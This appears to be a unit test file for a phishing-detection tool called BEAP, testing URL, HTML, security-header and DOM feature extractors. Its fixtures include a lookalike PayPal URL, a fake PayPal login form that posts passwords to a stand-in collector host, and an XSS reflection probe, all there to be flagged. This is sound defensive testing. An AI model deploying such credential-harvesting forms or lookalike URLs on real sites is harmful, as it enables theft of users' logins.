"""
Unit tests for BEAP feature extractors.
"""

import pytest
import numpy as np
from beap.config import STATIC_URL_FEATURES, STATIC_HTML_FEATURES, DYNAMIC_BROWSER_FEATURES
from beap.static_features import extract_url_features, extract_html_features
from beap.browser_evidence import extract_header_evidence, extract_tls_evidence, extract_dom_behavior_evidence


def test_url_features_extraction():
    url = "https://login-verification-paypal.xyz/account/auth?token=123"
    feats = extract_url_features(url)
    assert isinstance(feats, dict)
    assert len(feats) == len(STATIC_URL_FEATURES)
    assert feats["is_high_risk_tld"] == 1.0
    assert feats["suspicious_keyword_count"] >= 2.0
    assert feats["uses_https"] == 1.0
    assert feats["num_query_params"] == 1.0


def test_html_features_extraction():
    html = """
    <html><head><title>PayPal Login</title></head>
    <body>
        <form action="http://malicious-collector.com/post" method="POST">
            <input type="text" name="user" />
            <input type="password" name="password" />
            <input type="hidden" name="state" value="12" />
            <button type="submit">Submit</button>
        </form>
    </body></html>
    """
    feats = extract_html_features(html, base_url="https://secure-portal.com/login")
    assert feats["num_forms"] == 1.0
    assert feats["has_password_input"] == 1.0
    assert feats["external_form_action_ratio"] == 1.0
    assert feats["has_hidden_inputs"] == 1.0


def test_browser_headers_evidence():
    headers = {
        "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
        "Content-Security-Policy": "default-src 'self'; form-action 'self';",
        "X-Frame-Options": "DENY",
        "X-Content-Type-Options": "nosniff"
    }
    evidence = extract_header_evidence(headers)
    assert evidence["has_hsts"] == 1.0
    assert evidence["hsts_max_age_adequate"] == 1.0
    assert evidence["has_csp"] == 1.0
    assert evidence["csp_restricts_form_action"] == 1.0
    assert evidence["has_x_frame_options"] == 1.0
    assert evidence["x_frame_options_strict"] == 1.0
    assert evidence["has_x_content_type_options"] == 1.0


def test_dom_behavior_evidence():
    html = """
    <body oncontextmenu="return false">
        <form action="http://collector.net/post"></form>
        <!--beap_xss_probe_918273-->
    </body>
    """
    evidence = extract_dom_behavior_evidence(
        html_content=html,
        base_url="https://mycorp.com",
        reflection_probe="<!--beap_xss_probe_918273-->"
    )
    assert evidence["has_right_click_disabled"] == 1.0
    assert evidence["script_reflection_detected"] == 1.0
    assert evidence["form_action_cross_domain"] == 1.0

